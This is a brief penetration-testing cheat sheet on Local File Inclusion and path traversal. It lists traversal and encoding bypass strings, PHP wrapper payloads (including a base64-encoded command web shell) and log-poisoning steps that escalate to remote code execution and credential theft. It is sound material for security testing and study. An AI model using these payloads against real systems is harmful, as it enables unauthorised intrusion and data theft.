# LFI (Local File Inclusion) & Path Traversal Reference

## Attack Surface Signals
- Parameters loading local assets/files: `file`, `path`, `page`, `template`, `include`, `doc`, `folder`, `view`.
- File download, log viewer, document display, language switching endpoints (`?lang=en`).

## Traversal Patterns & Bypasses
1. **Path Traversal Sequences**:
   - `../../../../etc/passwd`
   - Windows: `..\..\..\..\windows\win.ini` or `C:\windows\win.ini`.
2. **Filter & Blacklist Bypasses**:
   - Nested sequences: `....//....//etc/passwd`, `..././..././etc/passwd`.
   - URL encoding: `%2e%2e%2f`, double encoding `%252e%252e%252f`, UTF-8 `%c0%ae%c0%ae%c0%af`.
   - Semicolons / null bytes (legacy): `/etc/passwd%00.html`, `../../../../etc/passwd;.png`.
   - Absolute path injection: `/etc/passwd`.
3. **PHP Wrappers (PHP Targets)**:
   - Source code extraction: `php://filter/convert.base64-encode/resource=index.php`
   - Arbitrary code execution (if `allow_url_include=On`): `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`
   - Input execution: `php://input` with raw POST body containing PHP code.
4. **Log Poisoning to RCE**:
   - Inject PHP payload in `User-Agent` (`<?php system($_GET['c']); ?>`).
   - Include web access log: `?file=/var/log/apache2/access.log&c=id` or `/var/log/nginx/access.log`.
   - SSH log poisoning via failed login: `ssh '<?php system($_GET["c"]); ?>'@target.com` -> include `/var/log/auth.log`.
   - `/proc/self/environ` or `/proc/self/fd/{N}` inclusion.

## Exploit Chains
- **LFI → PHP Wrapper Source Code Leak → Hardcoded Secret / DB Credentials Theft**.
- **LFI + Log Poisoning / Session Upload → Full RCE**.
